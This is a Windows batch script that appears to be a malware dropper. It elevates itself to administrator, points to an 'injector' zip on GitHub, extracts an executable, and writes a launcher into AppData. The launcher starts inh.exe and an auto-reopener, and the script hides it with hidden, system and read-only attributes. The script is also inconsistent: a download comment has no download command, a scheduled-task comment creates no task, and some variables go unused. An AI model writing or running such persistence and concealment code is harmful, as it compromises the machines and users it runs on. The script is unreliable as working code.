@echo off
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

cd /d "%~dp0"

set "URL=https://github.com/dexovision/injector/raw/main/inh.zip"
set "ZIPFILE=inh.zip"
set "DESTDIR=repo"

:: Run download silently with NO window

mkdir "%DESTDIR%" 2>nul
tar -xf "%ZIPFILE%" -C "%DESTDIR%"


set "EXE_NAME=inh.exe"
set "SOURCE_PATH=%~dp0repo\inh.exe"
set "STARTUP_PATH=%USERPROFILE%\AppData\%EXE_NAME%"


:: Create scheduled task
set "outfile=%appdata%\launcher.bat"

(
    echo @echo off
    echo start "" "%USERPROFILE%\AppData\inh.exe"
    echo start "" "%USERPROFILE%\AppData\autoreopener.bat"
) > "%outfile%"

attrib +h +s +r "%appdata%\launcher.bat"


set "LAUNCHER=%APPDATA%\launcher.bat"
